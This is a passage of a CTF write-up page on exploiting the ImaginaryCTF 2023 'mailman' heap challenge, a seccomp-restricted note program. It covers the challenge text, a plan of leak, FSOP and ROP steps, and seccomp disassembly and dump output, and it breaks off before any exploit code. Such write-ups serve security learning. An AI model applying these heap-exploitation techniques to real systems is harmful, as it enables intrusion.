<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png?v=2"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png?v=2"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png?v=2"/><link rel="manifest" href="/static/favicons/site.webmanifest?v=2"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg?v=2" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>ImaginaryCTF 2023 – mailman</title><meta name="robots" content="follow, index"/><meta name="description" content="Because *every* protection had to be on."/><meta property="og:url" content="https://sekai.team/blog/imaginary-ctf-2023/mailman/"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Project SEKAI"/><meta property="og:description" content="Because *every* protection had to be on."/><meta property="og:title" content="ImaginaryCTF 2023 – mailman"/><meta property="og:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=ImaginaryCTF+2023+%E2%80%93+mailman&amp;desc=Because+*every*+protection+had+to+be+on.&amp;authors=Surg"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/ProjectSEKAIctf"/><meta name="twitter:title" content="ImaginaryCTF 2023 – mailman"/><meta name="twitter:description" content="Because *every* protection had to be on."/><meta name="twitter:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=ImaginaryCTF+2023+%E2%80%93+mailman&amp;desc=Because+*every*+protection+had+to+be+on.&amp;authors=Surg"/><meta property="article:published_time" content="2023-07-24T00:00:00.000Z"/><link rel="canonical" href="https://surg.dev/ictf23/"/><link rel="canonical" href="https://sekai.team/blog/imaginary-ctf-2023/mailman/"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://sekai.team/blog/imaginary-ctf-2023/mailman"
  },
  "headline": "ImaginaryCTF 2023 – mailman",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://og-vercel-ruby.vercel.app/api/sekai?title=ImaginaryCTF+2023+%E2%80%93+mailman&desc=Because+*every*+protection+had+to+be+on.&authors=Surg"
    }
  ],
  "datePublished": "2023-07-24T00:00:00.000Z",
  "dateModified": "2023-07-24T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Surg"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Project SEKAI",
    "logo": {
      "@type": "ImageObject",
      "url": "https://sekai.team/static/images/fullLogo.svg"
    }
  },
  "description": "Because *every* protection had to be on."
}</script><meta name="next-head-count" content="21"/><link rel="preload" href="/_next/static/css/206f24680f6266ec.css" as="style"/><link rel="stylesheet" href="/_next/static/css/206f24680f6266ec.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-09a75c9ee2bd415e.js" defer=""></script><script src="/_next/static/chunks/main-b8c3e234d7065a2c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8cbc7cb85baf88e.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/29107295-a2d0c8e72019a3ed.js" defer=""></script><script src="/_next/static/chunks/545-f1dc6b53ce85b08b.js" defer=""></script><script src="/_next/static/chunks/930-1296a6163e1e3cc6.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-9a47024c9df525b8.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_buildManifest.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_ssgManifest.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_middlewareManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuLyfMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuGKYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuFuYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body class="antialiased text-black bg-white dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex flex-col justify-between h-screen"><header class="flex items-center justify-between py-10"><div><a aria-label="Visit home page" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 468.7 215.63" height="80" width="auto"><defs><linearGradient id="fullLogo_svg__linear-gradient" x1="-7051.74" y1="5608.42" x2="-7051.74" y2="5392.1" gradientTransform="matrix(1 0 .15 -.99 6503.98 5547.9)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00e5ea"></stop><stop offset="1" stop-color="#00b5cc"></stop></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-2" x1="1498.32" y1="4428.84" x2="1497.92" y2="4311.82" gradientTransform="matrix(1 0 0 -1 -1107.01 4435.41)" xlink:href="#fullLogo_svg__linear-gradient"></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-3" x1="320.76" y1="14.17" x2="320.76" y2="47.97" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0069a5"></stop><stop offset="1" stop-color="#003d6b"></stop></linearGradient><style>.fullLogo_svg__cls-1{fill:#fff}</style></defs><g id="fullLogo_svg__Project_SEKAI_Wide_White" data-name="Project SEKAI Wide White"><path class="fullLogo_svg__cls-1" d="M107 117.14v-4c11.93 0 22.15-8.62 23.76-20l12.91-91.63h4.06l-13 92.14c-1.92 13.4-13.84 23.49-27.73 23.49Z"></path><path class="fullLogo_svg__cls-1" d="M97.43 98.3a16 16 0 0 1-16.26-18.72l8.68-61.42A21.78 21.78 0 0 1 110.77 0a16.34 16.34 0 0 1 12.57 5.5A16.36 16.36 0 0 1 127 18.72l-8.69 61.42c-1.39 10.01-10.77 18.16-20.88 18.16ZM110.77 4a17.63 17.63 0 0 0-17 14.72l-8.64 61.42a12 12 0 0 0 12.3 14.16 17.65 17.65 0 0 0 16.95-14.72l8.69-61.42a12.41 12.41 0 0 0-2.75-10A12.4 12.4 0 0 0 110.77 4ZM186.94 5.42l.56-3.91H162.99l-13.5 95.44H174l.57-4h-20.46l5.85-41.36h20.46l.56-4h-20.45l5.96-42.17h20.45zM266.73 1.51h-31.01l-.55 3.91h14.2l-12.95 91.53h4.06l12.93-91.53h12.77l.55-3.91zM212.61 1.51a15.86 15.86 0 0 0-15.24 13.24l-9.86 69.48a11.69 11.69 0 0 0 2.76 9.34 12.57 12.57 0 0 0 9.18 4.43h.2c6.38 0 11.65-5.57 15.15-9.28L211.9 86c-3.06 3.23-7.67 8.11-12.38 8a8.54 8.54 0 0 1-6.21-3 7.73 7.73 0 0 1-1.84-6.18l9.86-69.48a11.83 11.83 0 0 1 11.28-9.9h13.91l.55-3.91ZM37.08 5.58a12 12 0 0 0-9.26-4.06H13.5L0 97h4.06l6.41-45.37h10.84a15.87 15.87 0 0 0 15.24-13.29l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.26 23a11.74 11.74 0 0 1-11.27 9.8H11l6-42.13h10.85a7.94 7.94 0 0 1 8 9.33ZM75.09 5.58a12 12 0 0 0-9.26-4.06h-14.3L38 97h4l6.5-45.42h10L65 96.2h4l-6.6-45a16 16 0 0 0 12.16-12.86l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.25 23a11.76 11.76 0 0 1-11.28 9.8H49.07L55 5.42h10.86a7.94 7.94 0 0 1 8 9.33ZM223.75 215.47h-4.06l13.5-95.43h4.05l-13.49 95.43zM65.83 215.63a14.49 14.49 0 0 1-11-4.65 11.3 11.3 0 0 1-2.68-9.15l1.31-8.59 4.4-2.34-1.76 11.52a7.24 7.24 0 0 0 1.75 5.93 10.47 10.47 0 0 0 8 3.28c6.42 0 12.26-4.39 13-9.8l5.42-38.33-28.77 15.27 6.37-46c1-7.3 8.65-13.24 17-13.24a14.52 14.52 0 0 1 11 4.65 11.36 11.36 0 0 1 2.68 9.14l-1.2 8.68-4.35 2.34 1.64-11.6a7.29 7.29 0 0 0-1.74-6 10.5 10.5 0 0 0-8-3.28c-6.42 0-12.26 4.39-13 9.79l-5.29 38.27 28.8-15.28-6.52 46.1c-1.11 7.35-8.73 13.29-17.06 13.29ZM174.15 120.04h-4.51l-26.9 51.72 7.31-51.72H146l-13.5 95.43h4.05l4.5-31.8 10.61-20.4 12.61 52.2h4.11l-13.91-57.6 19.68-37.83zM205 215.47h4l-2.29-94.87v-.56h-4l-29.31 95.43h4.18l9.82-32h16.83Zm-16.37-36L203 132.68l1.13 46.81ZM132.58 123.94l.56-3.91h-24.52l-13.49 95.44h24.51l.56-4H99.75l5.85-41.36h20.45l.57-4h-20.46l5.97-42.17h20.45z"></path><path style="fill:url(#fullLogo_svg__linear-gradient)" d="M279.69 1.51h8.87l-32.09 213.93h-8.87L279.69 1.51z"></path><path d="M393.81 14.88C396 .34 331.4 1.5 296.53 1.5L283.6 87.67c33.36-1.94 99.5-2 97.21 13.27-1.14 7.58-5.53 7.29-6.1 11.08-1.52 10.14 70.94 5.62 81.15 4.52L434 73.6l34.7-43.29c-17.47 1.81-82.47 4.94-81.11-4.15.73-4.87 5.41-5.56 6.22-11.28Z" style="fill:url(#fullLogo_svg__linear-gradient-2)"></path><path d="m324.34 13-5.8 25.24A9.73 9.73 0 0 0 312 36c-4.66 0-8.43 2.82-8.42 6.27s3.8 6.24 8.46 6.22c4 0 7.4-2.12 8.23-4.92 0-.14.06-.28.09-.42l3.48-15.5q9.18 2.06 9.72 5.26a9 9 0 0 1-1.27 6.22 10.78 10.78 0 0 0 5.7-8.81q.48-5.88-13.65-17.32Z" style="fill:url(#fullLogo_svg__linear-gradient-3)"></path></g></svg></div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/members/">Members</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/contests/">Contests</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/blog/">Blog</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/tags/">Tags</a><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100">CTF 2023</a></div><div class="sm:hidden"><button type="button" class="w-8 h-8 py-1 ml-1 mr-1 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed w-full h-full top-24 right-0 bg-gray-200 dark:bg-gray-800 opacity-95 z-10 transform ease-in-out duration-300 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed w-full h-full cursor-auto focus:outline-none"></button><nav class="fixed h-full mt-8"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/members/">Members</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/contests/">Contests</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog/">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags/">Tags</a></div><div class="px-12 py-4"><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100">CTF 2023</a></div></nav></div></div></div></header><main class="mb-auto"><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><dd class="text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2023-07-24T00:00:00.000Z">Monday, 24 July 2023</time></dd></div></dl><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">ImaginaryCTF 2023 – mailman</h1></div></div></header><div class="pb-8 divide-y divide-gray-200 xl:divide-y-0 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:pt-11 xl:border-b xl:border-gray-200 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 xl:block sm:space-x-12 xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><img src="https://www.gravatar.com/avatar/731fa44fbe6dc1baa4352a7e640bc73a?d=identicon&amp;s=256" width="38px" height="38px" alt="avatar" class="w-10 h-10 rounded-full"/><dl class="text-sm font-medium leading-5 whitespace-nowrap"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">Surg</dd><dt class="sr-only">Twitter</dt><dd><a target="_blank" rel="noopener noreferrer" href="https://twitter.com/Sam_Ruggerio" class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400">@Sam_Ruggerio</a></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:pb-0 xl:col-span-3 xl:row-span-2"><div class="pt-10 pb-8 prose dark:prose-dark max-w-none"><h1 id="mailman-423pts-31-solves"><a href="#mailman-423pts-31-solves" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>mailman (423pts, 31 solves)</h1>
<blockquote>
<p>I’m sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there...</p>
<p>Flag is in <code>./flag.txt</code>.</p>
<p>Attachments: <a target="_blank" rel="noopener noreferrer" href="https://imaginaryctf.org/r/PIxtO#vuln">https://imaginaryctf.org/r/PIxtO#vuln</a> <a target="_blank" rel="noopener noreferrer" href="https://imaginaryctf.org/r/c9Mk8#libc.so.6">https://imaginaryctf.org/r/c9Mk8#libc.so.6</a></p>
</blockquote>
<p>imaginaryCTF ran this past weekend. I competed with <a target="_blank" rel="noopener noreferrer" href="https://sekai.team/">Project Sekai</a>, where we placed third. I helped solve <code>ret2lose</code>, <code>mailman</code>, <code>lcode</code>, and <code>vmdungeon</code>. I wanted to mainly focus on <code>mailman</code> as that challenge I worked on the most and ended up with the full exploit chain.</p>
<p>I’m also going to go through this entire exploit with a detailed explanation, as I find heap pwn to be constantly confusing, and there’s more and more techniques being used and employed in CTFs, so I hope that this explains why I used the tools and methods I did.</p>
<h2 id="table-of-contents"><a href="#table-of-contents" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Table of Contents</h2>
<ol>
<li><a href="#secrets">My mailman has secrets</a></li>
<li><a href="#leaky">Leaky Program</a></li>
<li><a href="#botcake">One More Leak, now with cakes!</a></li>
<li><a href="#fsop">ROP? I Like FSOP.</a></li>
<li><a href="#rop">FSOP? I Like ROP.</a></li>
<li><a href="#tldr">TLDR</a></li>
<li><a href="#script">Full Script (Annotated)</a></li>
</ol>
<h2 id="my-mailman-has-secrets-"><a href="#my-mailman-has-secrets-" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>My mailman has secrets <a name="secrets"></a></h2>
<p>Mailman was a standard heapnote type challenge (I’ve seen it referred to as <code>CRUD</code>: <code>Create Read Update DELETE</code>). Loading into the program, we’re given options to write, read, or send a letter:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">Welcome to the post office.
</span><span class="code-line">Enter your choice below:
</span><span class="code-line">1. Write a letter
</span><span class="code-line">2. Send a letter
</span><span class="code-line">3. Read a letter
</span><span class="code-line">&gt;
</span></code></pre></div>
<p>Picking 1 allows us to specify an index, letter size (in bytes), and then send data, terminating on a new line. Picking 2 lets us pick an index, but seemingly does nothing, and picking 3 outputs the text of the letter that we select.</p>
<p>We aren’t given source, so we have to look at it in a disassembler. The first thing Binary Ninja shows us in the <code>main</code> function is <code>seccomp</code>:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token number">00001365</span>      <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>rax_2<span class="token punctuation">,</span> <span class="token number">0x7fff0000</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">00001385</span>      <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>rax_2<span class="token punctuation">,</span> <span class="token number">0x7fff0000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000013</span>a5      <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>rax_2<span class="token punctuation">,</span> <span class="token number">0x7fff0000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000013</span>c5      <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>rax_2<span class="token punctuation">,</span> <span class="token number">0x7fff0000</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000013e5</span>      <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>rax_2<span class="token punctuation">,</span> <span class="token number">0x7fff0000</span><span class="token punctuation">,</span> <span class="token number">0x3c</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000013f</span><span class="token number">1</span>      <span class="token function">seccomp_load</span><span class="token punctuation">(</span>rax_2<span class="token punctuation">)</span>
</span></code></pre></div>
<p>seccomp is a way to make a type of &quot;jail&quot; for linux programs. It restricts execution to a limited set of syscalls, and kills the program if it attempts to call banned ones. While one could probably parse out that this is setting up an allowlist of syscalls <code>0</code>, <code>1</code>, <code>2</code>, <code>5</code>, and <code>0x3c</code>, I don’t know seccomp by heart. Luckily, <code>seccomp-tools</code> can tell us exactly what is going on here:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">srg@pop-os:~/CTF/ictf23/mailman$ seccomp-tools dump ./vuln
</span><span class="code-line"> line  CODE  JT   JF      K
</span><span class="code-line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
</span><span class="code-line"> 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch
</span><span class="code-line"> 0001: 0x15 0x00 0x09 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0011
</span><span class="code-line"> 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number
</span><span class="code-line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005
</span><span class="code-line"> 0004: 0x15 0x00 0x06 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0011
</span><span class="code-line"> 0005: 0x15 0x04 0x00 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token builtin class-name">read</span><span class="token punctuation">)</span> goto 0010
</span><span class="code-line"> 0006: 0x15 0x03 0x00 0x00000001  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">write</span><span class="token punctuation">)</span> goto 0010
